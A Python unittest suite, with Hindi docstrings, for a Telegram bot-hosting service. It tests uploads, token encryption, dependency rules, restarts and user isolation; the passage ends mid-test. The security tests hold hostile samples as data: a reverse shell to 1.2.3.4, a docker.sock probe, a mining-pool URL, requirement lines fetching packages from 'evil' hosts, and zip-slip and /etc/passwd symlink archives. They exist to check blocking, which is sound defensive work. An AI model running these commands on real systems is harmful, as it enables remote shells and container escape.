"""OM AUTO HOSTING BOT - टेस्ट suite (unittest).

⚠️ इस Sandbox में Docker, Telegram और Internet नहीं है, इसलिए:
  - Bots LocalRunner (असुरक्षित, सिर्फ़ टेस्ट) में चलते हैं - Docker की Isolation यहाँ टेस्ट नहीं होती.
  - Telegram API (getMe/setMyCommands) और Firebase नकली (mock) जवाब देते हैं.
  - TeleBot/PTB/aiogram/node-telegram-bot-api के नकली stubs ZIP में रखे जाते हैं (असली Libraries नहीं).
"""
import io
import json
import os
import shutil
import signal
import sys
import tempfile
import threading
import time
import unittest
import zipfile
from http.server import BaseHTTPRequestHandler, HTTPServer
from pathlib import Path
from urllib.parse import parse_qs, urlparse

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))
sys.path.insert(0, str(ROOT / "tests"))

import fake_telebot as ft
ft.install()

from cryptography.fernet import Fernet  # noqa: E402

import admin_panel  # noqa: E402
import file_receiver  # noqa: E402
import firebase_checker as fb  # noqa: E402
import handlers  # noqa: E402
import keyboards as K  # noqa: E402
import security_manager as sec  # noqa: E402
from config import Config  # noqa: E402
from context import build_context  # noqa: E402
from docker_runner import LocalRunner  # noqa: E402

SAMPLES = ROOT / "tests" / "samples"
STUBS = ROOT / "tests" / "stubs"
OWNER, FRIEND, FRIEND2, STRANGER = 1000, 2000, 3000, 9999
GOOD1 = "2222222221:GOOD" + "x" * 31
GOOD2 = "2222222222:GOOD" + "y" * 31
GOOD3 = "2222222223:GOOD" + "z" * 31
BAD = "3333333333:BAD" + "x" * 31


class R:
    def __init__(self, j):
        self._j = j

    def json(self):
        return self._j


POSTS = []


def http_get(url, **kw):
    if "getMe" in url:
        tok = url.split("/bot")[1].split("/")[0]
        if "GOOD" in tok:
            return R({"ok": True, "result": {"id": int(tok.split(":")[0]), "username": "bot_" + tok[-3:]}})
        return R({"ok": False, "error_code": 401, "description": "Unauthorized"})
    raise AssertionError(url)


def http_post(url, **kw):
    POSTS.append((url.split("/")[-1], kw.get("json")))
    return R({"ok": True, "result": True})


def make_zip(path, files: dict):
    with zipfile.ZipFile(path, "w", zipfile.ZIP_DEFLATED) as z:
        for arc, src in files.items():
            if isinstance(src, (bytes, str)) and not (isinstance(src, str) and os.path.exists(src)):
                z.writestr(arc, src)
            elif os.path.isdir(src):
                for p in Path(src).rglob("*"):
                    if p.is_file():
                        z.write(p, f"{arc}/{p.relative_to(src)}")
            else:
                z.write(src, arc)
    return path


def wait_for(fn, timeout=40, interval=0.3):
    end = time.time() + timeout
    while time.time() < end:
        v = fn()
        if v:
            return v
        time.sleep(interval)
    return None


class Base(unittest.TestCase):
    def setUp(self):
        POSTS.clear()
        self.tmp = Path(tempfile.mkdtemp(prefix="omtest_"))
        cfg = Config()
        cfg.data_dir = self.tmp / "data"
        cfg.secret_key = Fernet.generate_key().decode()
        cfg.owner_id = OWNER
        cfg.friend_ids = {FRIEND, FRIEND2}
        cfg.bot_token = "1111111111:" + "A" * 35
        cfg.runner_mode = "local"
        cfg.allow_unsafe_local = True
        cfg.startup_observe_sec = 3
        cfg.install_timeout_sec = 90
        cfg.max_bots_per_user = 5
        self.cfg = cfg
        self.make_ctx()

    def make_ctx(self):
        cfg = self.cfg
        cfg.ensure_dirs()
        runner = LocalRunner(cfg)
        self.ctx = ctx = build_context(cfg, runner=runner, http_get=http_get, http_post=http_post)
        ctx.tg = ft.FakeTeleBot()
        ctx.send = handlers.make_sender(ctx)
        ctx.reply_text = lambda uid, text: ctx.send(uid, text)
        ctx.manager.set_notifier(ctx.send)
        admin_panel.register(ctx)
        file_receiver.register(ctx)
        handlers.register(ctx)
        self.tg = ctx.tg

    def tearDown(self):
        for bid in list(self.ctx.runner.list_running()):
            self.ctx.runner.stop(bid)
        shutil.rmtree(self.tmp, ignore_errors=True)

    # ---- helpers
    def say(self, uid, text, mid=1):
        return self.tg.feed_message(ft.msg(uid, text, mid=mid))

    def upload(self, uid, name, data: bytes, fid=None):
        fid = fid or f"f_{name}_{time.time()}"
        self.tg.files[fid] = data
        return self.tg.feed_message(ft.msg(uid, doc=ft.doc(fid, name, len(data)), mid=77))

    def upload_file(self, uid, path, name=None):
        return self.upload(uid, name or Path(path).name, Path(path).read_bytes())

    def click(self, uid, data):
        return self.tg.feed_callback(ft.cb(uid, data))

    def bots(self, uid=OWNER):
        return self.ctx.db.list_bots(uid)

    def status(self, bid):
        return self.ctx.db.get_bot(bid)["status"]

    def wait_status(self, bid, *want, timeout=40):
        return wait_for(lambda: self.status(bid) in want, timeout)

    def first_bot(self, uid=OWNER, timeout=15):
        wait_for(lambda: self.bots(uid), timeout)
        return self.bots(uid)[-1]["id"]

    def all_text(self, uid=None):
        return "\n".join(self.tg.texts(uid))

    def find_cb(self, uid, prefix):
        for cid, _t, mk in reversed(self.tg.sent):
            if cid != uid or not mk:
                continue
            for row in mk.rows:
                for b in row:
                    if getattr(b, "callback_data", None) and b.callback_data.startswith(prefix):
                        return b.callback_data
        return None

    def sample_zip(self, name, files):
        return make_zip(self.tmp / name, files)


# ================================================================ tests
class T01_Basics(Base):
    def test_plain_python_script(self):
        """एक सामान्य Python Script: Upload → Analysis → Host → Logs"""
        self.upload_file(OWNER, SAMPLES / "plain_script.py")
        bid = self.first_bot()
        self.assertTrue(self.wait_status(bid, "running"), self.all_text(OWNER))
        self.assertTrue(wait_for(lambda: self.ctx.runner.is_running(bid)))
        self.assertTrue(wait_for(lambda: "tick" in self.ctx.manager.logs_text(OWNER, bid)))
        self.assertTrue(wait_for(lambda: "Host हो गया" in self.all_text(OWNER), 15), self.all_text(OWNER))
        self.assertIn("Auto File Analysis", self.all_text(OWNER))

    def test_syntax_error(self):
        """Invalid Python Syntax: Host नहीं होता, लाइन नंबर के साथ कारण बताता है"""
        self.upload_file(OWNER, SAMPLES / "syntax_error.py")
        bid = self.first_bot()
        self.assertTrue(self.wait_status(bid, "failed"))
        txt = self.all_text(OWNER)
        self.assertIn("Syntax Error", txt)
        self.assertFalse(self.ctx.runner.is_running(bid))

    def test_missing_configuration(self):
        """Missing Configuration: Script को MY_API_KEY चाहिए → माँगता है → देने पर चलता है"""
        self.upload_file(OWNER, SAMPLES / "missing_config.py")
        bid = self.first_bot()
        self.assertTrue(self.wait_status(bid, "awaiting_config"))
        self.assertIn("MY_API_KEY", self.all_text(OWNER))
        state, _ = self.ctx.db.get_state(OWNER)
        self.assertTrue(state.startswith("await_cfg:"))
        self.say(OWNER, "supersecretvalue123", mid=5)
        self.assertIn((OWNER, 5), self.tg.deleted)  # संदेश मिटाया गया
        self.assertTrue(self.wait_status(bid, "running"), self.all_text(OWNER))
        logs = wait_for(lambda: self.ctx.manager.logs_text(OWNER, bid))
        self.assertNotIn("supersecretvalue123", logs)

    def test_crashed_process_report(self):
        """Crashed Process: Error Report में कारण (boom) दिखता है, Status failed"""
        self.upload_file(OWNER, SAMPLES / "crash.py")
        bid = self.first_bot()
        self.assertTrue(self.wait_status(bid, "failed", timeout=30), self.all_text(OWNER))
        txt = self.all_text(OWNER)
        self.assertIn("Error Report", txt)
        self.assertIn("boom", txt)
        self.assertIn("boom", self.ctx.manager.error_text(OWNER, bid))

    def test_stopped_process(self):
        """Stopped Process: Stop → बंद, Start → फिर चालू, बाकी Bot पर असर नहीं"""
        self.upload_file(OWNER, SAMPLES / "plain_script.py")
        a = self.first_bot()
        self.assertTrue(self.wait_status(a, "running"))
        shutil.copy(SAMPLES / "plain_script.py", self.tmp / "second.py")
        self.upload_file(OWNER, self.tmp / "second.py")
        b = wait_for(lambda: len(self.bots()) == 2 and self.bots()[-1]["id"])
        self.assertTrue(self.wait_status(b, "running"))
        self.ctx.manager.stop_bot(OWNER, a)
        self.assertFalse(self.ctx.runner.is_running(a))
        self.assertTrue(self.ctx.runner.is_running(b), "दूसरा Bot चलता रहना चाहिए")
        self.assertEqual(self.status(a), "stopped")
        self.ctx.manager.start_bot(OWNER, a)
        self.assertTrue(wait_for(lambda: self.ctx.runner.is_running(a) and self.status(a) == "running"))
        # अलग Process और अलग Working Directory
        pa, pb = self.ctx.db.get_bot(a)["project_dir"], self.ctx.db.get_bot(b)["project_dir"]
        self.assertNotEqual(pa, pb)
        self.assertNotEqual(self.ctx.runner.pid(a), self.ctx.runner.pid(b))

    def test_auto_restart_after_kill(self):
        """Auto Restart/Recovery: Process को बाहर से मारने पर Monitor दोबारा चालू करता है"""
        self.upload_file(OWNER, SAMPLES / "plain_script.py")
        bid = self.first_bot()
        self.assertTrue(self.wait_status(bid, "running"))
        self.assertTrue(wait_for(lambda: "Host हो गया" in self.all_text(OWNER), 15))  # Start की जाँच पूरी
        pid = self.ctx.runner.pid(bid)
        os.killpg(os.getpgid(pid), signal.SIGKILL)
        self.assertTrue(wait_for(lambda: not self.ctx.runner.is_running(bid), 10))
        self.ctx.monitor.tick(now=time.time() + 100)
        self.assertTrue(wait_for(lambda: self.ctx.runner.is_running(bid) and self.ctx.db.get_status(bid)["restart_count"] == 1, 15))
        self.assertNotEqual(self.ctx.runner.pid(bid), pid)

    def test_server_restart_recovery(self):
        """Server Restart: नया Manager चलते Bot को अपनाता है, बंद मिले तो दोबारा चालू करता है"""
        self.upload_file(OWNER, SAMPLES / "plain_script.py")
        bid = self.first_bot()
        self.assertTrue(self.wait_status(bid, "running"))
        self.assertTrue(wait_for(lambda: self.ctx.runner.is_running(bid)))
        time.sleep(3.5)  # Start की जाँच पूरी हो जाए
        pid = self.ctx.runner.pid(bid)
        self.make_ctx()  # Hosting Bot "Restart": नए objects, वही data folder
        res = self.ctx.manager.recover_all()
        self.assertEqual(res["adopted"], 1, res)
        self.assertEqual(self.ctx.runner.pid(bid), pid)
        os.killpg(os.getpgid(pid), signal.SIGKILL)  # अब VM Restart जैसा: Process गायब
        wait_for(lambda: not self.ctx.runner.is_running(bid), 10)
        self.make_ctx()
        res = self.ctx.manager.recover_all()
        self.assertEqual(res["restarted"], 1, res)
        self.assertTrue(wait_for(lambda: self.ctx.runner.is_running(bid)))
        self.assertEqual(self.bots()[0]["owner_id"], OWNER)  # DB में सब बना रहा


class T02_Frameworks(Base):
    def vend(self, main_sample, main_name, stub, extra=None):
        files = {main_name: str(SAMPLES / main_sample), stub: str(STUBS / stub)}
        files.update(extra or {})
        return self.sample_zip(f"{main_sample}.zip", files)

    def test_telebot_script_full_flow(self):
        """TeleBot Script: Framework/Commands पहचान, Token माँगना, गलत/सही Token, Host, Token Logs में नहीं"""
        z = self.vend("telebot_bot.py", "bot.py", "telebot")
        self.upload_file(OWNER, z, "tb.zip")
        bid = self.first_bot()
        self.assertTrue(self.wait_status(bid, "awaiting_config"), self.all_text(OWNER))
        txt = self.all_text(OWNER)
        self.assertIn("TeleBot", txt)
        self.assertIn("/start /help /status", txt)
        self.assertIn("Token", txt)
        # गलत Token
        self.say(OWNER, BAD, mid=10)
        self.assertIn("नहीं माना", self.all_text(OWNER))
        self.assertEqual(self.status(bid), "awaiting_config")
        self.assertIn((OWNER, 10), self.tg.deleted)
        # सही Token
        self.say(OWNER, GOOD1, mid=11)
        self.assertTrue(self.wait_status(bid, "running"), self.all_text(OWNER))
        self.assertIn((OWNER, 11), self.tg.deleted)
        # Token Encrypted, दूसरे User को नहीं मिलता, Logs में छिपा
        raw = self.ctx.db.q1("SELECT token_enc FROM bot_tokens WHERE bot_id=?", (bid,))["token_enc"]
        self.assertNotIn("GOOD", raw)
        self.assertEqual(self.ctx.tokens.get_bot_token(bid, OWNER), GOOD1)
        self.assertIsNone(self.ctx.tokens.get_bot_token(bid, FRIEND))
        logs = wait_for(lambda: "TeleBot stub started" in self.ctx.manager.logs_text(OWNER, bid) and self.ctx.manager.logs_text(OWNER, bid))
        self.assertTrue(logs)
        self.assertNotIn(GOOD1, logs)
        self.assertIn("REDACTED", logs)
        for _cid, t, _m in self.tg.sent:
            self.assertNotIn(GOOD1, t, "Token किसी संदेश में नहीं दिखना चाहिए")
        # Commands Menu: सिर्फ़ पहचाने गए
        self.assertTrue(wait_for(lambda: [p for p in POSTS if p[0] == "setMyCommands"], 15))
        sc = [p for p in POSTS if p[0] == "setMyCommands"]
        self.assertEqual([c["command"] for c in sc[-1][1]["commands"]], ["start", "help", "status"])

    def test_ptb_placeholder_patch(self):
        """python-telegram-bot Script: placeholder Token → अनुमति के बाद सिर्फ़ एक लाइन बदली, backup रहा"""
        z = self.vend("ptb_bot.py", "main.py", "telegram")
        self.upload_file(OWNER, z, "ptb.zip")
        bid = self.first_bot()
        self.assertTrue(self.wait_status(bid, "awaiting_config"))
        self.say(OWNER, GOOD1, mid=20)
        cbd = wait_for(lambda: self.find_cb(OWNER, "patch:"))
        self.assertTrue(cbd, self.all_text(OWNER))
        self.assertEqual(self.status(bid), "awaiting_config")  # अनुमति तक Source नहीं बदला
        proj = Path(self.ctx.db.get_bot(bid)["project_dir"])
        self.assertIn("YOUR_BOT_TOKEN_HERE", (proj / "main.py").read_text())
        self.click(OWNER, cbd[:-1] + "y")
        self.assertTrue(self.wait_status(bid, "running"), self.all_text(OWNER))
        self.assertTrue(wait_for(lambda: [p for p in POSTS if p[0] == "setMyCommands"], 15))
        self.assertNotIn("YOUR_BOT_TOKEN_HERE", (proj / "main.py").read_text())
        self.assertIn("YOUR_BOT_TOKEN_HERE", (proj / ".om_backup" / "main.py.orig").read_text())
        sc = [p for p in POSTS if p[0] == "setMyCommands"][-1][1]["commands"]
        self.assertEqual([c["command"] for c in sc], ["start", "settings"])  # 'Export' (बड़ा अक्षर) Menu में नहीं

    def test_ptb_patch_declined(self):
        """Source बदलने की अनुमति न देने पर Code नहीं बदलता और Bot Host नहीं होता"""
        z = self.vend("ptb_bot.py", "main.py", "telegram")
        self.upload_file(OWNER, z, "ptb.zip")
        bid = self.first_bot()
        self.assertTrue(self.wait_status(bid, "awaiting_config"))
        self.say(OWNER, GOOD1, mid=20)
        cbd = wait_for(lambda: self.find_cb(OWNER, "patch:"))
        self.click(OWNER, cbd[:-1] + "n")
        time.sleep(1)
        proj = Path(self.ctx.db.get_bot(bid)["project_dir"])
        self.assertIn("YOUR_BOT_TOKEN_HERE", (proj / "main.py").read_text())
        self.assertFalse(self.ctx.runner.is_running(bid))

    def test_aiogram_env_flow(self):
        """aiogram Script: BOT_TOKEN Environment से पढ़ती है → Token देकर Host, Commands पहचाने"""
        z = self.vend("aiogram_bot.py", "main.py", "aiogram")
        self.upload_file(OWNER, z, "ai.zip")
        bid = self.first_bot()
        self.assertTrue(self.wait_status(bid, "awaiting_config"))
        self.assertIn("aiogram", self.all_text(OWNER))
        self.say(OWNER, GOOD2, mid=30)
        self.assertTrue(self.wait_status(bid, "running"), self.all_text(OWNER))
        self.assertEqual([c["name"] for c in self.ctx.manager.analysis_of(self.ctx.db.get_bot(bid))["commands"]], ["start", "help", "about"])

    def test_token_reuse_rejected(self):
        """एक Token दो Bots में नहीं लग सकता"""
        z = self.vend("telebot_bot.py", "bot.py", "telebot")
        self.upload_file(OWNER, z, "a.zip")
        a = self.first_bot()
        self.wait_status(a, "awaiting_config")
        self.say(OWNER, GOOD3, mid=40)
        self.assertTrue(self.wait_status(a, "running"))
        self.upload_file(OWNER, z, "b.zip")
        b = wait_for(lambda: len(self.bots()) == 2 and self.bots()[-1]["id"])
        self.wait_status(b, "awaiting_config")
        self.say(OWNER, GOOD3, mid=41)
        self.assertIn("पहले से किसी और Hosted Bot", self.all_text(OWNER))

    def test_hardcoded_token_in_source(self):
        """Code में लिखा Token: जाँचा जाता है; गलत निकले तो नया माँगकर (अनुमति से) बदला जाता है"""
        z = self.vend("hardcoded_token_bot.py", "bot.py", "telebot")
        self.upload_file(OWNER, z, "hc.zip")
        bid = self.first_bot()
        self.assertTrue(self.wait_status(bid, "awaiting_config"), self.all_text(OWNER))
        self.assertIn("Token Telegram ने नहीं माना", self.all_text(OWNER))
        self.assertNotIn("AAHdummy", self.all_text(OWNER))  # पुराना Token संदेश में नहीं

    def test_javascript_bot_vendored(self):
        """JavaScript Telegram Bot: package.json/commands पहचान, Token Environment से, Host"""
        if not shutil.which("node"):
            self.skipTest("node नहीं है")
        z = self.sample_zip("js.zip", {"node_bot.js": str(SAMPLES / "node_bot.js"),
                                       "package.json": '{"name":"x","main":"node_bot.js","scripts":{"start":"node node_bot.js"}}',
                                       "node_modules": str(STUBS / "nodemods")})
        self.upload_file(OWNER, z, "js.zip")
        bid = self.first_bot()
        self.assertTrue(self.wait_status(bid, "awaiting_config"), self.all_text(OWNER))
        self.assertIn("node-telegram-bot-api", self.all_text(OWNER))
        self.assertIn("/start /ping", self.all_text(OWNER))
        self.say(OWNER, GOOD1, mid=50)
        self.assertTrue(self.wait_status(bid, "running"), self.all_text(OWNER))
        self.assertTrue(wait_for(lambda: "node stub bot" in self.ctx.manager.logs_text(OWNER, bid)))

    def test_javascript_plain_and_syntax_error(self):
        """JavaScript: सामान्य Script चलती है; Syntax गलती पकड़ी जाती है"""
        if not shutil.which("node"):
            self.skipTest("node नहीं है")
        self.upload_file(OWNER, SAMPLES / "node_plain.js")
        bid = self.first_bot()
        self.assertTrue(self.wait_status(bid, "running"), self.all_text(OWNER))
        self.upload(OWNER, "bad.js", b"function (:\nconsole.log(1)\n")
        b2 = wait_for(lambda: len(self.bots()) == 2 and self.bots()[-1]["id"])
        self.assertTrue(self.wait_status(b2, "failed"), self.all_text(OWNER))
        self.assertIn("Syntax", self.all_text(OWNER))


class T03_Dependencies(Base):
    def test_missing_requirements_txt_detection(self):
        """requirements.txt नहीं है: Imports से Packages पहचाने गए (अनुमति वाली नीति के साथ)"""
        self.upload_file(OWNER, SAMPLES / "telebot_bot.py")
        bid = self.first_bot()
        self.assertTrue(self.wait_status(bid, "awaiting_config"))
        bot = self.ctx.db.get_bot(bid)
        an = self.ctx.manager.analysis_of(bot)
        self.assertEqual([m["pip"] for m in an["missing"]], ["pyTelegramBotAPI"])
        plan = self.ctx.deps.plan_python(bot, an)
        self.assertEqual([(i.name, i.status) for i in plan.items], [("pyTelegramBotAPI", "ok")])

    def test_missing_unknown_package_needs_permission(self):
        """Missing Package (अनजान नाम): बिना अनुमति Install नहीं, पूछता है; मना करने पर blocked"""
        self.upload_file(OWNER, SAMPLES / "missing_pkg.py")
        bid = self.first_bot()
        self.assertTrue(self.wait_status(bid, "awaiting_confirm"), self.all_text(OWNER))
        self.assertIn("nonexistent_pkg_xyz", self.all_text(OWNER))
        cbd = self.find_cb(OWNER, "inst:")
        self.assertTrue(cbd)
        self.click(OWNER, cbd[:-1] + "n")
        row = [d for d in self.ctx.db.list_deps(bid) if d["name"] == "nonexistent_pkg_xyz"][0]
        self.assertEqual(row["status"], "blocked")
        self.assertFalse(os.path.exists(Path(self.ctx.db.get_bot(bid)["project_dir"]) / ".venv"))

    def test_missing_module_error_classification(self):
        """Missing Module Error: Logs से पहचान कर सही package का नाम सुझाता है"""
        from error_handler import classify
        r = classify("ModuleNotFoundError: No module named 'telebot'")
        self.assertEqual((r.kind, r.fix["name"], r.fix["known"]), ("missing_module", "pyTelegramBotAPI", True))
        r = classify("ModuleNotFoundError: No module named 'zzzweird'")
        self.assertFalse(r.fix["known"])

    def test_dependency_safety_rules(self):
        """Dependency सुरक्षा: URL/Git/option/typosquat रोके जाते हैं; पुराने API के लिए version pin"""
        bad = ["git+https://x/y.git", "pkg @ https://evil/x.whl", "-r other.txt", "--index-url http://evil", "requets"]
        for line in bad:
            self.assertFalse(sec.check_requirement_line(line).ok, line)
        self.assertTrue(sec.check_requirement_line("requests==2.31.0").ok)
        self.assertFalse(sec.check_npm_dependency("x", "github:a/b").ok)
        self.assertFalse(sec.check_npm_dependency("x", "https://evil/x.tgz").ok)
        self.assertTrue(sec.check_npm_dependency("telegraf", "^4.16.0").ok)
        # v13 / aiogram v2 pin
        from file_analyzer import analyze_project
        from project_detector import scan_project
        d = self.tmp / "v13"
        d.mkdir()
        (d / "main.py").write_text("from telegram.ext import Updater, Filters\nu = Updater('tok', use_context=True)\nu.start_polling()\n")
        an = analyze_project(d, scan_project(d))
        self.assertEqual(an.pins[0]["spec"], "==13.15")
        d2 = self.tmp / "ag2"
        d2.mkdir()
        (d2 / "main.py").write_text("from aiogram import Bot, Dispatcher, executor\nexecutor.start_polling(None)\n")
        an = analyze_project(d2, scan_project(d2))
        self.assertEqual(an.pins[0]["spec"], "<3")

    def test_requirements_name_fix_and_blocked(self):
        """requirements.txt में telebot → pyTelegramBotAPI अपने-आप सही; URL वाली line blocked"""
        d = self.tmp / "rq"
        d.mkdir()
        (d / "main.py").write_text("import telebot\n")
        (d / "requirements.txt").write_text("telebot\nfoo @ https://evil/x.whl\nrequests==2.31.0\n")
        bid = self.ctx.db.create_bot(OWNER, "rq", d, "python", "main.py")
        plan = self.ctx.deps.plan_python(self.ctx.db.get_bot(bid), {"missing": [], "pins": []})
        got = {i.name: i.status for i in plan.items}
        self.assertEqual(got["pyTelegramBotAPI"], "ok")
        self.assertEqual(got["requests"], "ok")
        self.assertEqual(got["foo @ https://evil/x.whl"[:60]], "blocked")

    def test_offline_install_fails_gracefully(self):
        """pip Install फेल (Internet नहीं): साफ़ संदेश, Bot failed, Crash नहीं"""
        d = self.tmp / "off.zip"
        make_zip(d, {"main.py": "import time\nprint('x')\ntime.sleep(5)\n", "requirements.txt": "requests==2.31.0\n"})
        self.upload_file(OWNER, d, "off.zip")
        bid = self.first_bot()
        self.assertTrue(self.wait_status(bid, "failed", "running", timeout=120), self.all_text(OWNER))
        if self.status(bid) == "failed":
            self.assertIn("Install", self.all_text(OWNER))


class T04_ZipAndSecurity(Base):
    def test_zip_project_nested_root(self):
        """ZIP Project: एक Folder के अंदर Project, कई Scripts, सही Entry (main.py) चुनी गई"""
        z = self.sample_zip("p.zip", {"myproj/main.py": "import utils\nutils.go()\n",
                                      "myproj/utils.py": "import time\ndef go():\n    print('zip project running', flush=True)\n    time.sleep(30)\n",
                                      "myproj/requirements.txt": "# खाली\n",
                                      "myproj/helper.py": "x = 1\n"})
        self.upload_file(OWNER, z, "p.zip")
        bid = self.first_bot()
        self.assertTrue(self.wait_status(bid, "running"), self.all_text(OWNER))
        self.assertEqual(self.ctx.db.get_bot(bid)["entry_file"], "main.py")
        self.assertTrue(wait_for(lambda: "zip project running" in self.ctx.manager.logs_text(OWNER, bid)))

    def test_zip_attacks_blocked(self):
        """ZIP सुरक्षा: Zip-Slip, Symlink, Zip-Bomb, Absolute path, Password ZIP रोके जाते हैं"""
        d = self.tmp / "ex"
        slip = self.tmp / "slip.zip"
        with zipfile.ZipFile(slip, "w") as z:
            z.writestr("../evil.py", "x")
        with self.assertRaises(sec.SecurityError):
            sec.safe_extract_zip(slip, d)
        self.assertFalse((self.tmp / "evil.py").exists())
        absz = self.tmp / "abs.zip"
        with zipfile.ZipFile(absz, "w") as z:
            z.writestr("/etc/evil", "x")
        with self.assertRaises(sec.SecurityError):
            sec.safe_extract_zip(absz, d)
        sym = self.tmp / "sym.zip"
        with zipfile.ZipFile(sym, "w") as z:
            zi = zipfile.ZipInfo("link")
            zi.external_attr = (0o120777 << 16)
            z.writestr(zi, "/etc/passwd")
        with self.assertRaises(sec.SecurityError):
            sec.safe_extract_zip(sym, d)
        bomb = self.tmp / "bomb.zip"
        with zipfile.ZipFile(bomb, "w", zipfile.ZIP_DEFLATED) as z:
            z.writestr("big.txt", b"0" * (30 * 1024 * 1024))
        with self.assertRaises(sec.SecurityError):
            sec.safe_extract_zip(bomb, d, max_total_bytes=10 * 1024 * 1024)
        with self.assertRaises(sec.SecurityError):
            sec.safe_extract_zip(bomb, d, max_ratio=50, max_total_bytes=100 * 1024 * 1024)
        many = self.tmp / "many.zip"
        with zipfile.ZipFile(many, "w") as z:
            for i in range(30):
                z.writestr(f"f{i}.txt", "x")
        with self.assertRaises(sec.SecurityError):
            sec.safe_extract_zip(many, d, max_files=10)

    def test_zip_slip_through_upload_creates_no_bot(self):
        """Upload के रास्ते आया खराब ZIP: कोई Bot नहीं बनता, संदेश मिलता है"""
        slip = self.tmp / "slip.zip"
        with zipfile.ZipFile(slip, "w") as z:
            z.writestr("../../evil.py", "print(1)")
        self.upload_file(OWNER, slip, "slip.zip")
        wait_for(lambda: "Zip-Slip" in self.all_text(OWNER) or "बाहर" in self.all_text(OWNER) or ".." in self.all_text(OWNER))
        time.sleep(0.5)
        self.assertEqual(self.bots(), [])
        self.assertFalse((self.cfg.data_dir / "evil.py").exists())

    def test_static_scan_blocks_dangerous_code(self):
        """खतरनाक Code (docker.sock/miner/reverse shell): रोका जाता है, चलाया नहीं जाता, फाइलें हटती हैं"""
        for i, code in enumerate(["import os\nos.system('ls /var/run/docker.sock')\n",
                                  "import subprocess\nsubprocess.run('bash -i >& /dev/tcp/1.2.3.4/9 0>&1', shell=True)\n",
                                  "pool = 'stratum+tcp://x:3333'\n"]):
            self.upload(OWNER, f"evil{i}.py", code.encode())
            bid = wait_for(lambda: len(self.bots()) == i + 1 and self.bots()[-1]["id"])
            self.assertTrue(self.wait_status(bid, "blocked"), self.all_text(OWNER))
            self.assertFalse(self.ctx.runner.is_running(bid))
            self.assertEqual(list(Path(self.ctx.db.get_bot(bid)["project_dir"]).iterdir()), [])
        self.assertIn("सुरक्षा कारण से रोका गया", self.all_text(OWNER))

    def test_unsupported_language_project(self):
        """PHP/HTML/APK Project: पहचान होती है, चलाने का दावा नहीं (Runtime नहीं)"""
        z = self.sample_zip("php.zip", {"index.php": "<?php echo 1;", "style.css": "a{}", "page.html": "<p>"})
        self.upload_file(OWNER, z, "php.zip")
        wait_for(lambda: "Host नहीं हो सकता" in self.all_text(OWNER))
        self.assertIn("PHP", self.all_text(OWNER))
        self.assertEqual(self.bots(), [])
        self.upload(OWNER, "app.apk", b"PK\x03\x04fake")
        wait_for(lambda: "Android APK" in self.all_text(OWNER))
        self.assertIn("Host नहीं किया जा सकता", self.all_text(OWNER))

    def test_secret_redaction_and_paths(self):
        """Secret Redaction और Path Traversal Protection"""
        tok = "123456789:AAHabcdefghijklmnopqrstuvwxyz012345"
        out = sec.redact(f"x https://api.telegram.org/bot{tok}/getMe y auth=SECRETVALUE&z", secrets=["hello-secret"])
        self.assertNotIn(tok, out)
        self.assertNotIn("SECRETVALUE", out)
        self.assertEqual(sec.redact("hello-secret!", ["hello-secret"]), "[REDACTED]!")
        self.assertEqual(sec.safe_filename("../../etc/passwd"), "passwd")
        self.assertEqual(sec.safe_filename("..\\..\\x.py"), "x.py")
        with self.assertRaises(sec.SecurityError):
            sec.safe_join(self.tmp, "..", "x")
        with self.assertRaises(sec.SecurityError):
            sec.safe_join(self.tmp, "/etc/passwd")
        import logging, logs_manager
        logs_manager.setup_system_logging(self.cfg)
        logging.getLogger("om.t").error("token %s leaked", tok)
        for h in logging.getLogger().handlers:
            h.flush()
        self.assertNotIn(tok, (self.cfg.logs_dir / "om.log").read_text())

    def test_env_file_upload_refused(self):
        """.env फाइल: सहेजी नहीं जाती, संदेश मिटाया जाता है"""
        self.upload(OWNER, ".env", b"BOT_TOKEN=1234567890:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n")
        self.assertIn((OWNER, 77), self.tg.deleted)
        self.assertEqual(list((self.cfg.users_dir / str(OWNER)).glob("uploads/*")) if (self.cfg.users_dir / str(OWNER)).exists() else [], [])

    def test_upload_size_limit(self):
        """बहुत बड़ी फाइल रोकी जाती है"""
        self.tg.files["big"] = b"x"
        self.tg.feed_message(ft.msg(OWNER, doc=ft.doc("big", "big.py", 50 * 1024 * 1024), mid=3))
        self.assertIn("बहुत बड़ी", self.all_text(OWNER))
        self.assertEqual(self.bots(), [])


class T05_AccessAndUsers(Base):
    def test_stranger_blocked(self):
        """अनजान User: कोई सुविधा/Upload नहीं, बस एक बार निजी बॉट वाला संदेश"""
        self.say(STRANGER, "/start")
        self.say(STRANGER, "/start")
        self.upload(STRANGER, "x.py", b"print(1)")
        self.click(STRANGER, "pick:start:1")
        self.say(STRANGER, K.MENU[0])
        self.assertEqual(self.bots(STRANGER), [])
        self.assertEqual(len(self.tg.texts(STRANGER)), 1)
        self.assertIn("निजी Hosting Bot", self.all_text(STRANGER))
        self.assertFalse((self.cfg.users_dir / str(STRANGER)).exists())

    def test_group_chat_ignored(self):
        """Group Chat में Bot कुछ नहीं करता"""
        m = ft.msg(OWNER, "/start")
        m.chat.type = "group"
        self.tg.feed_message(m)
        self.assertEqual(self.tg.sent, [])

    def test_two_users_separation(self):
        """दो अलग Users: अलग Folder; एक दूसरे का Bot/Token/Logs/Files नहीं छू सकता"""
        self.upload_file(OWNER, SAMPLES / "plain_script.py")
        self.upload_file(FRIEND, SAMPLES / "plain_script.py")
        a, b = self.first_bot(OWNER), self.first_bot(FRIEND)
        self.assertTrue(self.wait_status(a, "running"))
        self.assertTrue(self.wait_status(b, "running"))
        da, db_ = Path(self.ctx.db.get_bot(a)["project_dir"]), Path(self.ctx.db.get_bot(b)["project_dir"])
        self.assertNotEqual(da, db_)
        self.assertIn(f"users/{OWNER}/", str(da))
        self.assertIn(f"users/{FRIEND}/", str(db_))
        m = self.ctx.manager
        from bot_manager import BotError
        for fn in (m.stop_bot, m.start_bot, m.restart_bot, m.delete_bot, m.status_text, m.logs_text, m.error_text,
                   m.files_text, m.config_text, m.deps_text, m.commands_text, m.reanalyze_text, m.toggle_auto_restart, m.clear_logs):
            with self.assertRaises(BotError, msg=fn.__name__):
                fn(FRIEND, a)
        with self.assertRaises(BotError):
            m.rename_bot(FRIEND, a, "hacked")
        with self.assertRaises(BotError):
            m.attach_file(FRIEND, a, __file__, "requirements.txt")
        self.assertIsNone(self.ctx.db.get_bot(a, FRIEND))
        # Telegram के रास्ते (Callback) से कोशिश
        before = len(self.tg.sent)
